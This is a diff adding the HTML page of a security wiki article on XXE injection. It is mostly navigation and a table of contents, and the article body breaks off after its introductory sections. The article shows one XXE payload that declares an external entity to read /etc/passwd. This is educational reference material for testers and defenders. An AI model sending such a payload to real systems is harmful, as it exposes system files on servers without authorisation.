@@ -1,0 +1,2151 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="XXE (XML External Entities) # XML External Entity Injection (XXE) is a web security vulnerability that allows attackers to interfere with an application&rsquo;s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.
+XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="XXE (XML External Entities)" />
+<meta property="og:description" content="XXE (XML External Entities) # XML External Entity Injection (XXE) is a web security vulnerability that allows attackers to interfere with an application&rsquo;s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.
+XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>XXE (XML External Entities) | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class=" active">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>XXE (XML External Entities)</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#xxe-xml-external-entities">XXE (XML External Entities)</a>
+      <ul>
+        <li><a href="#fundamentals-of-xxe">Fundamentals of XXE</a>
+          <ul>
+            <li><a href="#xml-components">XML Components</a></li>
+            <li><a href="#types-of-xml-entities">Types of XML Entities</a></li>
+            <li><a href="#when-xxe-is-possible">When XXE is Possible</a></li>
+            <li><a href="#requirements">Requirements</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#exploitation-techniques">Exploitation Techniques</a>
+          <ul>
+            <li><a href="#1-quick-check-for-xxe"><strong>1. Quick Check for XXE</strong></a></li>
+            <li><a href="#2-classic-file-read-linuxwindows"><strong>2. Classic File Read (Linux/Windows)</strong></a></li>
+            <li><a href="#linux"><strong>Linux:</strong></a></li>
+            <li><a href="#windows"><strong>Windows:</strong></a></li>
+            <li><a href="#3-ssrf-test-internal-network-probe"><strong>3. SSRF Test (Internal Network Probe)</strong></a></li>
+            <li><a href="#4-base64-encoded"><strong>4. Base64 Encoded</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#advanced-xxe-attack-vectors"><strong>Advanced XXE Attack Vectors</strong></a>
+          <ul>
+            <li><a href="#1-blind-xxe-with-out-of-band-oob-data-exfiltration"><strong>1. Blind XXE with Out-of-Band (OOB) Data Exfiltration</strong></a></li>
+            <li><a href="#method-1-classic-oob-via-parameter-entities"><strong>Method 1: Classic OOB via Parameter Entities</strong></a></li>
+            <li><a href="#method-2-error-based-exfiltration"><strong>Method 2: Error-Based Exfiltration</strong></a></li>
+            <li><a href="#method-3-repurposing-a-local-dtd">Method 3: <strong>Repurposing a local DTD</strong></a></li>
+            <li><a href="#2-xxe-inside-non-xml-formats"><strong>2. XXE Inside Non-XML Formats</strong></a></li>
+            <li><a href="#json--xxe-conversion-trick"><strong>JSON → XXE Conversion Trick</strong></a></li>
+            <li><a href="#xxe-in-svg-files"><strong>XXE in SVG Files</strong></a></li>
+            <li><a href="#3-xxe-via-xinclude-bypass-dtd-blocks"><strong>3. XXE via XInclude (Bypass DTD Blocks)</strong></a></li>
+            <li><a href="#4-xxe-in-soap-requests"><strong>4. XXE in SOAP Requests</strong></a></li>
+            <li><a href="#5-xxe-for-rce-rare-but-possible"><strong>5. XXE for RCE (Rare but Possible)</strong></a></li>
+            <li><a href="#phpexpectwrapper"><strong>PHP <code>expect://</code> Wrapper</strong></a></li>
+            <li><a href="#6-billion-laugh-attack">6. <strong>Billion Laugh Attack</strong></a></li>
+            <li><a href="#xslt-based-rce"><strong>XSLT-Based RCE</strong></a></li>
+            <li><a href="#7-bypassing-wafs--filters"><strong>7. Bypassing WAFs &amp; Filters</strong></a></li>
+            <li><a href="#utf-7-bypass"><strong>UTF-7 Bypass</strong></a></li>
+            <li><a href="#cdata--utf-16-bypass"><strong>CDATA + UTF-16 Bypass</strong></a></li>
+            <li><a href="#dtd-in-external-url-with-obfuscation"><strong>DTD in External URL with Obfuscation</strong></a></li>
+            <li><a href="#8-xxe-in-cloud-environments"><strong>8. XXE in Cloud Environments</strong></a></li>
+            <li><a href="#aws-metadata-ssrf"><strong>AWS Metadata SSRF</strong></a></li>
+            <li><a href="#azure-metadata"><strong>Azure Metadata</strong></a></li>
+            <li><a href="#gcp-metadata"><strong>GCP Metadata</strong></a></li>
+            <li><a href="#9-via-changing-content-type">9. <strong>Via Changing Content-Type</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#framework-specific-scenarios">Framework-Specific Scenarios</a>
+          <ul>
+            <li><a href="#java">Java</a></li>
+            <li><a href="#php">PHP</a></li>
+            <li><a href="#net">.NET</a></li>
+            <li><a href="#python">Python</a></li>
+            <li><a href="#nodejs">Node.js</a></li>
+          </ul>
+        </li>
+        <li><a href="#real-world-exploitation-scenarios"><strong>Real-World Exploitation Scenarios</strong></a>
+          <ul>
+            <li><a href="#1-stealing-ssh-keys"><strong>1. Stealing SSH Keys</strong></a></li>
+            <li><a href="#2-reading-database-credentials"><strong>2. Reading Database Credentials</strong></a></li>
+            <li><a href="#3-exploiting-windows-systems"><strong>3. Exploiting Windows Systems</strong></a></li>
+            <li><a href="#4-abusing-php-wrappers"><strong>4. Abusing PHP Wrappers</strong></a></li>
+            <li><a href="#5-xxe-in-pdf-generators"><strong>5. XXE in PDF Generators</strong></a></li>
+            <li><a href="#6-xxe-oob-with-apache-karaf"><strong>6. XXE OOB with Apache Karaf</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#manual-detection">Manual Detection</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention-techniques"><strong>Prevention Techniques</strong></a></li>
+        <li><a href="#tools"><strong>Tools</strong></a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#real-cves">Real CVEs</a></li>
+            <li><a href="#hackerone-reports">Hackerone Reports:</a></li>
+          </ul>
+        </li>
+        <li><a href="#references"><strong>References:</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="xxe-xml-external-entities">
+  XXE (XML External Entities)
+  <a class="anchor" href="#xxe-xml-external-entities">#</a>
+</h1>
+<p><strong>XML External Entity Injection (XXE)</strong> is a web security vulnerability that allows attackers to interfere with an application&rsquo;s processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.</p>
+<p>XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:</p>
+<p>✅ <strong>File Disclosure</strong> (e.g., <strong><code>/etc/passwd</code></strong>, <strong><code>/proc/self/environ</code></strong>)</p>
+<p>✅ <strong>SSRF</strong> (Internal API access, cloud metadata leaks)</p>
+<p>✅ <strong>Blind Data Exfiltration</strong> (OOB techniques)</p>
+<p>✅ <strong>Denial of Service</strong> (Billion Laughs, Quadratic Blowup)</p>
+<p>✅ <strong>RCE</strong> (In rare cases via PHP <strong><code>expect://</code></strong>, XSLT)</p>
+<hr>
+<h2 id="fundamentals-of-xxe">
+  Fundamentals of XXE
+  <a class="anchor" href="#fundamentals-of-xxe">#</a>
+</h2>
+<h3 id="xml-components">
+  XML Components
+  <a class="anchor" href="#xml-components">#</a>
+</h3>
+<p>Common XML declarations:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/root&gt;</span>
+</span></span></code></pre></div><ul>
+<li><strong>DOCTYPE</strong> – Defines the document type.</li>
+<li><strong>ENTITY</strong> – Declares reusable variables.</li>
+<li><strong>SYSTEM</strong> – Loads resources from local files or remote URLs.</li>
+<li><strong>PUBLIC</strong> – References externally available DTDs.</li>
+</ul>
+<h3 id="types-of-xml-entities">
+  Types of XML Entities
+  <a class="anchor" href="#types-of-xml-entities">#</a>
+</h3>
+<ul>
+<li>Internal entities</li>
+<li>External entities</li>
+<li>Parameter entities (<code>%entity</code>)</li>
+<li>General entities (<code>&amp;entity;</code>)</li>
+</ul>
+<h3 id="when-xxe-is-possible">
+  When XXE is Possible
+  <a class="anchor" href="#when-xxe-is-possible">#</a>
+</h3>
+<p>Typical situations include:</p>
+<ul>
+<li>SOAP APIs</li>
+<li>REST APIs accepting XML</li>
+<li>SAML assertions</li>
+<li>SVG uploads</li>
+<li>DOCX/XLSX/PPTX parsing</li>
+<li>RSS/Atom feeds</li>
+<li>XML configuration imports</li>
+<li>XML-based file uploads</li>
+</ul>
+<h3 id="requirements">
+  Requirements
+  <a class="anchor" href="#requirements">#</a>
+</h3>
+<p>XXE generally requires:</p>
+<ul>
+<li>XML parsing enabled</li>
+<li>External entity resolution enabled</li>
+<li>DTD processing enabled (except XInclude attacks)</li>
+</ul>
+<hr>
+<h2 id="attack-surface">
+  Attack Surface
+  <a class="anchor" href="#attack-surface">#</a>
+</h2>
+<p>Look for XML processing in:</p>
+<ul>
+<li>SOAP services</li>
+<li>REST APIs supporting XML</li>
+<li>XML file upload functionality</li>
+<li>SVG uploads</li>
